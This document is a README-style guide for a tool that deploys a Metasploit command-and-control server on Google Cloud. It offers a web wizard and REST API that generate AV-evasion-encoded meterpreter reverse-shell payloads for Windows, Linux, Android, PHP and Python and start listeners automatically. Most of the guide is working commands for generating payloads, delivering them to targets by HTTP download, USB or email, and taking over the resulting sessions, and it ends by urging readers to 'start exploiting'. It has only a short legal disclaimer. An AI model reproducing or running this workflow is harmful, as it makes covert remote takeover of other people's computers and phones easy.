# 🚀 GCP Metasploit Automation - Complete Guide

## What This Does

Automatically deploys a **fully-configured Metasploit server** on Google Cloud Platform with:

✅ **One-Click Payload Generation** - No command line needed
✅ **Automatic Listener Setup** - Starts in background automatically  
✅ **Easy Web Interface** - Simple 3-step wizard
✅ **REST API** - Programmatic access to all features
✅ **Auto-Downloads** - Direct download links for payloads
✅ **Session Management** - Track active sessions easily

## Quick Start (5 Minutes)

### 1. Deploy to GCP

```bash
# Make script executable
chmod +x gcp-metasploit-deploy.sh

# Run deployment
./gcp-metasploit-deploy.sh
```

**That's it!** The script will:
- Create a GCP instance
- Install Metasploit Framework
- Setup API server  
- Configure firewall rules
- Give you the server IP

### 2. Wait for Installation (~10 minutes)

Monitor the installation:
```bash
gcloud compute ssh metasploit-server --zone=us-central1-a \
  --command='tail -f /var/log/syslog | grep -i metasploit'
```

### 3. Test the API

```bash
# Replace with your server IP
SERVER_IP="YOUR_SERVER_IP"

# Health check
curl http://$SERVER_IP:3001/health

# Should return:
# {"status":"ok","service":"metasploit-api","version":"1.0.0"}
```

### 4. Update Frontend

Edit your frontend `config.js`:
```javascript
const appConfig = {
    KALI_MCP_ENDPOINT: 'http://YOUR_SERVER_IP:3001'
};
```

### 5. Use Easy Mode!

Navigate to: `https://www.atoms.ninja/metasploit-easy.html`

## Easy Mode Interface

The new **Easy Mode** simplifies everything into 3 steps:

### Step 1: Choose Platform
Click on your target platform:
- 💻 Windows (Desktop & Server)
- 🐧 Linux (Servers & IoT)
- 📱 Android (Mobile)
- 🌐 PHP (Web Servers)

### Step 2: Auto-Configuration
- Your IP is auto-detected
- Option to enable AV evasion encoding
- Click "Generate"

### Step 3: Get Results
- Download button for your payload
- Listener automatically started
- Instructions on what to do next
- Check sessions button

## API Endpoints

### Quick Setup (Easiest!)
```bash
curl -X POST http://YOUR_IP:3001/api/quick-setup \
  -H 'Content-Type: application/json' \
  -d '{
    "platform": "windows",
    "lhost": "YOUR_PUBLIC_IP",
    "lport": 4444,
    "encode": true
  }'
```

**Response:**
```json
{
  "success": true,
  "payload": {
    "id": 1731551234567,
    "name": "payload_windows_1731551234567.exe",
    "path": "/tmp/payload_windows_1731551234567.exe",
    "size": 73802,
    "downloadUrl": "/api/payload/download/payload_windows_1731551234567.exe"
  },
  "listener": {
    "platform": "windows",
    "payload": "windows/meterpreter/reverse_tcp",
    "lhost": "YOUR_IP",
    "lport": 4444,
    "status": "starting"
  },
  "jobId": 1731551234567,
  "instructions": {
    "download": "curl http://YOUR_IP:3001/api/payload/download/... -o payload.exe",
    "deliver": "Transfer the payload to your target system",
    "execute": "Run the payload on the target",
    "monitor": "curl http://YOUR_IP:3001/api/listener/status/1731551234567"
  }
}
```

### Generate Payload Only
```bash
curl -X POST http://YOUR_IP:3001/api/payload/generate \
  -H 'Content-Type: application/json' \
  -d '{
    "platform": "android",
    "lhost": "YOUR_IP",
    "lport": 4444,
    "encode": true
  }'
```

### Start Listener Only
```bash
curl -X POST http://YOUR_IP:3001/api/listener/start \
  -H 'Content-Type: application/json' \
  -d '{
    "platform": "linux",
    "lhost": "0.0.0.0",
    "lport": 4444
  }'
```

### Check Listener Status
```bash
curl http://YOUR_IP:3001/api/listener/status/JOB_ID
```

### List All Active Listeners
```bash
curl http://YOUR_IP:3001/api/listener/list
```

### Download Payload
```bash
curl http://YOUR_IP:3001/api/payload/download/FILENAME -o payload.exe
```

## Supported Platforms

### Windows
- **Payload**: `windows/meterpreter/reverse_tcp`
- **Format**: EXE
- **Encoder**: `x86/shikata_ga_nai`
- **Use Case**: Desktop exploitation

### Linux
- **Payload**: `linux/x64/meterpreter/reverse_tcp`
- **Format**: ELF
- **Encoder**: `x64/zutto_dekiru`
- **Use Case**: Server exploitation

### Android
- **Payload**: `android/meterpreter/reverse_tcp`
- **Format**: APK
- **Encoder**: None (built-in obfuscation)
- **Use Case**: Mobile device exploitation

### PHP
- **Payload**: `php/meterpreter/reverse_tcp`
- **Format**: PHP script
- **Encoder**: None
- **Use Case**: Web server exploitation

### Python
- **Payload**: `python/meterpreter/reverse_tcp`
- **Format**: Python script
- **Encoder**: None
- **Use Case**: Cross-platform scripts

## Complete Example Workflow

### 1. Deploy Server
```bash
./gcp-metasploit-deploy.sh
# Note the SERVER_IP from output
```

### 2. One Command to Rule Them All
```bash
SERVER_IP="34.123.45.67"  # Your server IP

curl -X POST http://$SERVER_IP:3001/api/quick-setup \
  -H 'Content-Type: application/json' \
  -d "{
    \"platform\": \"windows\",
    \"lhost\": \"$SERVER_IP\",
    \"lport\": 4444,
    \"encode\": true
  }" | jq '.'
```

### 3. Download Payload
```bash
# From the response, get the downloadUrl
curl http://$SERVER_IP:3001/api/payload/download/payload_windows_*.exe \
  -o payload.exe

ls -lh payload.exe
```

### 4. Deliver Payload
```bash
# Example: Host on simple HTTP server
python3 -m http.server 8000

# Target downloads:
# wget http://YOUR_IP:8000/payload.exe
# or use USB drive, email, etc.
```

### 5. Monitor for Sessions
```bash
# Check listener status
JOB_ID=1731551234567  # From quick-setup response

watch -n 5 "curl -s http://$SERVER_IP:3001/api/listener/status/$JOB_ID | jq '.'"
```

### 6. When Session Connects
```bash
# SSH into server
gcloud compute ssh metasploit-server --zone=us-central1-a

# Attach to msfconsole
screen -r

# Or start new console
msfconsole

# List sessions
sessions -l

# Interact with session 1
sessions -i 1

# You now have meterpreter access!
```

## Advanced Configuration

### Custom Ports
```bash
curl -X POST http://$SERVER_IP:3001/api/quick-setup \
  -H 'Content-Type: application/json' \
  -d '{
    "platform": "windows",
    "lhost": "YOUR_IP",
    "lport": 8443,
    "encode": true
  }'
```

### Multiple Listeners
```bash
# Start listener 1
curl -X POST http://$SERVER_IP:3001/api/listener/start \
  -d '{"platform":"windows","lhost":"0.0.0.0","lport":4444}'

# Start listener 2
curl -X POST http://$SERVER_IP:3001/api/listener/start \
  -d '{"platform":"linux","lhost":"0.0.0.0","lport":4445}'

# List all
curl http://$SERVER_IP:3001/api/listener/list
```

### Behind Reverse Proxy
Update nginx config on server:
```nginx
server {
    listen 80;
    server_name metasploit.yourdomain.com;
    
    location / {
        proxy_pass http://localhost:3001;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
    }
}
```

Then setup SSL:
```bash
certbot --nginx -d metasploit.yourdomain.com
```

## Troubleshooting

### API Not Responding
```bash
# Check if service is running
gcloud compute ssh metasploit-server --command='systemctl status metasploit-api'

# View logs
gcloud compute ssh metasploit-server --command='journalctl -u metasploit-api -f'

# Restart service
gcloud compute ssh metasploit-server --command='sudo systemctl restart metasploit-api'
```

### Firewall Issues
```bash
# Check firewall rules
gcloud compute firewall-rules list | grep metasploit

# Test port
telnet YOUR_IP 3001
nc -zv YOUR_IP 3001
```

### Payload Not Connecting
```bash
# Check listener is running
curl http://YOUR_IP:3001/api/listener/list

# Verify target can reach your IP
# On target: ping YOUR_IP
# On target: telnet YOUR_IP 4444
```

### Sessions Not Showing
```bash
# SSH into server
gcloud compute ssh metasploit-server

# Check msfconsole logs
tail -f /tmp/msf_*.log

# Manually start console
msfconsole

# Check database
msf> db_status
msf> sessions -l
```

## Security Best Practices

### 1. Restrict Access
```bash
# Update firewall to only allow your IP
gcloud compute firewall-rules update metasploit-api \
  --source-ranges YOUR_IP/32
```

### 2. Enable HTTPS
```bash
# On server, install certbot and get cert
certbot --nginx -d your-domain.com
```

### 3. Use Strong Authentication
Add API key authentication to server.js:
```javascript
app.use((req, res, next) => {
    const apiKey = req.headers['x-api-key'];
    if (apiKey !== process.env.API_KEY) {
        return res.status(401).json({ error: 'Unauthorized' });
    }
    next();
});
```

### 4. Regular Updates
```bash
# SSH into server
gcloud compute ssh metasploit-server

# Update Metasploit
msfupdate

# Update system
apt update && apt upgrade -y
```

### 5. Clean Up
```bash
# Delete old payloads
gcloud compute ssh metasploit-server --command='rm -f /tmp/payload_*'

# Clear logs
gcloud compute ssh metasploit-server --command='rm -f /tmp/msf_*.log'
```

## Cost Optimization

### Instance Sizing
```bash
# Minimal usage (testing)
MACHINE_TYPE="e2-micro"  # ~$7/month

# Normal usage
MACHINE_TYPE="e2-standard-2"  # ~$50/month

# Heavy usage
MACHINE_TYPE="n1-standard-4"  # ~$140/month
```

### Stop When Not in Use
```bash
# Stop instance
gcloud compute instances stop metasploit-server --zone=us-central1-a

# Start when needed
gcloud compute instances start metasploit-server --zone=us-central1-a
```

### Preemptible Instance (80% cheaper!)
```bash
# Add to deployment script
--preemptible \
--maintenance-policy TERMINATE
```

## Cleanup

### Delete Everything
```bash
# Delete instance
gcloud compute instances delete metasploit-server --zone=us-central1-a --quiet

# Delete firewall rules
gcloud compute firewall-rules delete metasploit-api --quiet
gcloud compute firewall-rules delete metasploit-listeners --quiet
```

## Integration with Frontend

Update your `metasploit-easy.html`:
```javascript
const API_BASE = 'http://YOUR_SERVER_IP:3001';
```

Or use environment variable:
```javascript
const API_BASE = window.location.hostname === 'localhost' 
    ? 'http://localhost:3001'
    : 'http://YOUR_SERVER_IP:3001';
```

## Support & Resources

- **Documentation**: See `METASPLOIT_GUIDE.md`
- **GCP Console**: https://console.cloud.google.com
- **Metasploit Docs**: https://docs.rapid7.com/metasploit
- **API Source**: Check `server.js` on deployed instance

## What's Next?

✅ You now have:
- Automated Metasploit server on GCP
- REST API for payload generation
- One-click listener setup  
- Easy mode web interface
- Download functionality
- Session management

🚀 **Ready to use!** Visit `/metasploit-easy.html` and start exploiting!

---

**⚠️ LEGAL DISCLAIMER**

Only use this tool on systems you own or have explicit written permission to test. Unauthorized access to computer systems is illegal.

---

**Built with ❤️ by Atoms.Ninja**
